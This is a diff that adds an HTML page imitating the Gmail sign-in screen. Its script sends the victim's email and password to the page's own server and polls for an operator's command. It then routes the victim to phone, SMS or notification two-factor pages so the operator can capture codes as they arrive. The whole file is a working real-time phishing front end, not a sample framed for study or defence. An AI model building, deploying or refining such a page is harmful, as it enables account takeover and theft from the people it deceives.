@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
+            <h1>Sign in</h1>
+            <p class="subtitle">to continue to Gmail</p>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="email" id="email" required placeholder=" ">
+                    <label>Email or phone</label>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password" required placeholder=" ">
+                    <label>Password</label>
+                </div>
+
+                <button type="submit" class="btn-next">Next</button>
+            </form>
+
+            <div id="loading" style="display:none;" class="loading">
+                <div class="spinner"></div>
+                <p>Verifying...</p>
+            </div>
+
+            <div id="sessionInfo" style="margin-top: 15px; font-size: 12px; color: #9aa0a6; text-align: center;"></div>
+        </div>
+    </div>
+
+    <script>
+        let sessionId = null;
+
+        async function initSession() {
+            try {
+                const response = await fetch('/api/visit', { method: 'POST' });
+                const data = await response.json();
+                sessionId = data.sessionId;
+                document.getElementById('sessionInfo').textContent = `Session: ${sessionId}`;
+                console.log('Session ID:', sessionId);
+            } catch (error) {
+                console.error('Session init error:', error);
+            }
+        }
+
+        initSession();
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            document.querySelector('.login-box').style.opacity = '0.5';
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                await fetch('/api/email', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, email })
+                });
+
+                await fetch('/api/password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, password })
+                });
+
+                await waitForCommand();
+
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
+
+        async function waitForCommand() {
+            const maxAttempts = 300;
+            let attempts = 0;
+
+            while (attempts < maxAttempts) {
+                try {
+                    const response = await fetch(`/api/command/${sessionId}`);
+                    const data = await response.json();
+
+                    if (data.command) {
+                        switch(data.command) {
+                            case 'success':
+                                window.location.href = '/success.html';
+                                break;
+                            case 'phone':
+                                window.location.href = '/2fa.html?method=phone';
+                                break;
+                            case 'sms':
+                                window.location.href = '/2fa.html?method=sms';
+                                break;
+                            case 'notification':
+                                window.location.href = '/2fa.html?method=notification';
+                                break;
+                        }
+                        return;
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                attempts++;
+            }
+
+            alert('Login timed out. Please try again.');
+            location.reload();
+        }
+    </script>
+</body>
+</html>
